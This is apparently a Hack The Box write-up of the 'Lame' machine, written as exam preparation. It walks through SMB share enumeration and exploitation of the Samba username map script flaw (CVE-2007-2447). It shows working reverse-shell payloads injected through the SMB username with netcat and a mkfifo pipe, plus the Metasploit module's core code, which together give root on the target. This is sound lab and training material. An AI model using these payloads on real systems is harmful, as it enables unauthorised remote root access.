# SMB

## Enumerating SMB Shares

Time to look at SMB instead. We can first map the shares:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```

The only one we can connect to is `tmp`. Trying gives us the following error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient -N //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is because our config is setup not to connect to shares on older SMB versions for security reasons. We can change our config at `/etc/samba.smb.conf`, or we can supply a command line parameter so we don't make an insecure config change and forget to revert it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May  3 21:52:58 2021
  ..                                 DR        0  Sat Oct 31 06:33:58 2020
  .ICE-unix                          DH        0  Mon May  3 21:43:29 2021
  vmware-root                        DR        0  Mon May  3 21:43:51 2021
  .X11-unix                          DH        0  Mon May  3 21:43:54 2021
  .X0-lock                           HR       11  Mon May  3 21:43:54 2021
  vgauthsvclog.txt.0                  R     1600  Mon May  3 21:43:26 2021

		7282168 blocks of size 1024. 5386612 blocks available
```

After all that, there was nothing interesting in the directory anyway. 

## SMB Exploit

So instead we can look at the version number in searchsploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ searchsploit Samba 3.0
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

...[snip]...

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                       | unix/remote/16320.rb

...[snip]...

Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                  | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                  | linux/remote/7701.txt

...[snip]...

----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There are a couple of exploits for the version we want. The remote heap overflow isn't clear how it should be executed, so even though we don't want to use metasploit I tried to look at the module to see how it works, using `searchsploit -x unix/remote/16320.rb`.

The metasploit module references [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447). This seems to be the key code:

```ruby
def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
				simple.client.negotiate(false)
				simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
				# nothing, it either worked or it didn't ;)
		end

		handler
end
```

It seems a payload should be supplied inside the username parameter when authenticating with SMB. Let's try to do so:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient //10.10.10.3/tmp -U "/=`nohup nc 10.10.14.13 9001 -e /bin/bash`"
nohup: ignoring input and redirecting stderr to stdout
```

We get a hit on our listener! But, strangely, it is from our box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.14.13] 37426
```

I did some googling, and it turns out backticks \` are executed by bash before the rest of the command ([according to Stack Exchange](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands)). This is used for command substitution, where the results are passed to bash.

I tried escaping the backticks this time - I also had to pass the extra parameter as I was getting the `NT_STATUS_CONNECTION_DISCONNECTED` error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient //10.10.10.3/tmp -U "/=\`nohup nc 10.10.14.13 9001 -e /bin/bash\`" --option='client min protocol=NT1'
Enter =`NOHUP NC 10.10.14.13 9001 -E \bin/bash`'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

This was potentially progress, as it was no longer evaluating the command on my box - but it wasn't giving me a shell either.

It seemed to be capitalising the command. I wasn't sure how to fix this, so I looked for a PoC script.

## PoC

Googling "CVE 2007 2447 poc" gave me [this exploit](https://github.com/amriunix/CVE-2007-2447). I cloned it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ git clone https://github.com/amriunix/CVE-2007-2447.git
```

This exploit builds the following payload:

```python
payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
username = "/=`nohup " + payload + "`"
```

I grabbed the `pysmb` library:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/CVE-2007-2447]
└─$ /usr/bin/python2 -m pip install pysmb
```

Then executed:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/CVE-2007-2447]
└─$ python2 usermap_script.py 10.10.10.3 445 10.10.14.13 9001
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

Sure enough:

![[Pasted image 20210503224059.png]]

The shell pops us out as root, so we can grab both flags:

![[Pasted image 20210503224421.png]]

There's no fancy 'you rooted Lame' screen for this one, as we had already cracked this box on the SESH account. Either way, that's the box!

## Alternate Method

After reading [0xdf's writeup](https://0xdf.gitlab.io/2020/04/07/htb-lame.html) I realised I could have used an alternate command to login to SMB after connecting, and supplied the payload there:

```bash
smb: \> logon "./=`nohup nc 10.10.14.13 9001 -e /bin/bash`"
```

# Tags

#writeup #oscp-prep #cve #smb 